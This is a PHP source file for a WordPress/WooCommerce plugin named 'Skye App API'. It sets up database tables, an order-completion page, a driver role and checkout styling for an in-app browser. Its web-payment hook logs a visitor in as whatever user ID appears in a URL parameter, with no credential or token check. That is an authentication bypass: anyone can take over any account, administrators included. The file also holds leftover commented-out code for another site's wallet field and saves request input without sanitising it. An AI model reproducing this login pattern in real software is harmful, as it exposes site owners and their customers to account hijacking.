<?php

// ON Activating plugin
//setup database
if (!function_exists('skye_activated')) {
    function skye_activated() {
    set_transient( 'skye-api-activated', true, 5);

    // setup database
    global $wpdb;
    $charset_collate = $wpdb->get_charset_collate();
    $cart_table = $wpdb->prefix . "skye_carts";
    $banners_table = $wpdb->prefix . "skye_app_banners";
    
    require_once(ABSPATH . '/wp-admin/includes/upgrade.php');
    $sql = "CREATE TABLE IF NOT EXISTS " . $cart_table . " (
                ID INT NOT NULL AUTO_INCREMENT,
                user VARCHAR(2000),
                cart_value LONGTEXT,
                session_expiry DATETIME,
                PRIMARY KEY (ID)
            ) " . $charset_collate . ";";
    dbDelta($sql);

    //database for banners
    $sql = "CREATE TABLE IF NOT EXISTS " . $banners_table . " (
                ID INT NOT NULL AUTO_INCREMENT,
                image INT,
                title VARCHAR(2000),
                description VARCHAR(2000),
                on_click_to VARCHAR(1000),
                category VARCHAR(1000),
                url VARCHAR(2000),
                PRIMARY KEY (ID)
            ) " . $charset_collate . ";";
    dbDelta($sql);


    //PAGE FOR ORDER COMPLETION
    $page_name = "app-complete-order";
        if ($page = get_page_by_path( $page_name)) {
            update_post_meta( $page->ID, '_wp_page_template', 'app-complete-order.php');
            update_metadata( 'page', $page->ID, '_wp_page_template', 'app-complete-order.php.php');
        } else {
            $page_args = array(
                'post_title' => 'Complete Order',
                'post_name' => $page_name,
                'post_content' => '',
                'post_status' => 'publish',
                'post_author' => 1,
                'post_type' => 'page'
            );
            $page_id = wp_insert_post( $page_args);
            update_post_meta( $page_id, '_wp_page_template', 'app-complete-order.php');
            update_metadata( 'page', $page_id, '_wp_page_template', 'app-complete-order.php');
        }


    }
}
//welcome message
add_action( 'admin_notices', function() {
   if (get_transient( 'skye-api-activated' )) { ?>
        <div class="updated notice is-dismissible">
            <p>Thank you for using Skye App API... You are on your way creating your <strong>awesome apps</strong>.</p>
        </div>
   <?php 
   //to only display this once
   delete_transient( 'skye-api-activated' );
   }
});
include(plugin_dir_path( __FILE__ ) . 'admin.php');



// FOR GIVEPHUCK WEBSITE - REMOVE THIS LATER please
// add_action( 'show_user_profile', 'extra_user_profile_fields' );
// add_action( 'edit_user_profile', 'extra_user_profile_fields' );

//function extra_user_profile_fields( $user ) { ? >
   // <!-- <h3><?php //_e("Tron Wallet", "blank"); ? ></h3> -->

//     <!-- <table class="form-table">
//     <tr>
//         <th><label for="tron-wallet"><?php //_e("Tron Wallet Address"); ? ></label></th>
//         <td>
//             <input type="text" name="tron-wallet" id="tron-wallet" value="<?php //echo esc_attr( get_the_author_meta( 'tron_wallet', $user->ID ) ); ? >" class="regular-text" /><br />
//             <span class="description">< ?php //_e("Please enter your tron wallet address."); ? ></span>
//         </td>
//     </tr>
//     </table> -->
// <?php // }
// add_action( 'personal_options_update', 'save_extra_user_profile_fields' );
// add_action( 'edit_user_profile_update', 'save_extra_user_profile_fields' );

// function save_extra_user_profile_fields( $user_id ) {
//     if ( empty( $_POST['_wpnonce'] ) || ! wp_verify_nonce( $_POST['_wpnonce'], 'update-user_' . $user_id ) ) {
//         return;
//     }

//     update_user_meta( $user_id, 'tron_wallet', $_POST['tron-wallet'] );
// }
// END OF - FOR GIVEVPHUCK WEBSITE 

function skye_update_custom_roles() {
    if ( get_option( 'skye_driver_roles_version' ) < 1 ) {
        add_role( 'skye_delivery_driver', 'Skye Delivery Driver', array( 'read' => true, 'level_0' => true ) );
        update_option( 'skye_driver_roles_version', 1 );
    }
}
add_action( 'init', 'skye_update_custom_roles' );


// FOR WEB PAYMENT
add_action( 'init', function() {

    if (isset($_GET["sk-user-checkout"]) && isset($_GET['sk-web-payment'])) {
        $user_id = $_GET["sk-user-checkout"];
        if (sk_user_exists($user_id)) {
            if (!is_user_logged_in() && get_current_user_id() != $user_id) {
                $user = get_user_by('ID', $user_id);
                clean_user_cache($user->ID);
                wp_clear_auth_cookie();
                wp_set_current_user( $user_id, $user->user_login);
                wp_set_auth_cookie( $user_id, true);
                do_action( 'wp_login', $user->user_login, $user);
                // clear cart in the browser first
                // WC()->cart->empty_cart();
                ?>
                <script>
                    document.location.reload(true);
                </script>
                <?php
            }
        } 
    }
});

//script to remove header, sidebar and footer from PAYMENT page AND BROWSER
add_action('wp_enqueue_scripts','ava_test_init');
function ava_test_init() {
    if (isset($_GET["sk-user-checkout"]) && isset($_GET["sk-stripe-checkout"]) && isset($_GET["pay_for_order"])) { //for stripe payment
        wp_enqueue_style( 'slider', plugin_dir_url( __FILE__ ) . 'stripe-style.css',false,'1.1','all');
        wp_enqueue_script( 'sk-js', plugins_url( '/stripe-script.js', __FILE__ ));
    } else if (isset($_GET["sk-user-checkout"]) && isset($_GET['sk-web-payment'])) { //for general payment
        wp_enqueue_style( 'slider', plugin_dir_url( __FILE__ ) . 'style.css',false,'1.1','all');
        wp_enqueue_script( 'sk-js', plugins_url( '/script.js', __FILE__ ));
    }
}

//for in app browser
add_action('wp_head', function() {
    if (isset($_GET["sk-user-checkout"]) && isset($_GET["sk-stripe-checkout"]) && isset($_GET["pay_for_order"])) { //for stripe payment and browser
     ?>
    <style>
        header, #masthead, div.storefront-breadcrumb, footer, aside, div.woocommerce-form-coupon-toggle, div.storefront-handheld-footer-bar, #glt-translate-trigger {
            display: none;
        }
        div.payment_box.payment_method_stripe, div.payment_box.payment_method_stripe {
            display: block;
        }
        ul.wc_payment_methods > :not(li.payment_method_stripe), ul.payment_methods methods > :not(li.payment_method_stripe) {
            display: none;
        }
    </style>
<?php
    } else if (isset($_GET["sk-user-checkout"]) && isset($_GET['sk-web-payment'])) { //for general payment
        ?>
            <style>
            header, #masthead, div.storefront-breadcrumb, footer, aside, div.storefront-handheld-footer-bar, #glt-translate-trigger {
                display: none;
            }
            </style>
        <?php
    }
 });

 //ORDER COMPLETING PAGE
 add_filter( 'page_template', function($template) {
    if(is_page_template('app-complete-order.php') || is_page('app-complete-order'))
        $template = plugin_dir_path( __FILE__ ) . 'pages/app-complete-order.php';

    return $template;
});



add_action( 'wp_footer', function() {
    // global $wc_points_rewards;
    // $order = new WC_Order(376);
    // $discount_code = WC_Points_Rewards_Discount::get_discount_code();
    // $discount_amount = 5;
    // $points_redeemed = WC_Points_Rewards_Manager::calculate_points_for_discount($discount_amount);
    // WC_Points_Rewards_Manager::decrease_points($order->get_user_id(), $points_redeemed, 'order-redeem', array('discount_code' => $discount_code, 'discount_amount' => $discount_amount), $order->get_id());
    // update_post_meta($order->get_id(), '_wc_points_redeemed', $points_redeemed);
    // // add order note
    // $order->add_order_note(sprintf(__('%d %s redeemed for a %s discount.', 'wc_points_rewards'), $points_redeemed, $wc_points_rewards->get_points_label($points_redeemed), wc_price($discount_amount)));
    // $order->calculate_totals();
    // $order->save();
    // sk_wc_order_add_discount(376, __("Fixed discount"), 12 );
});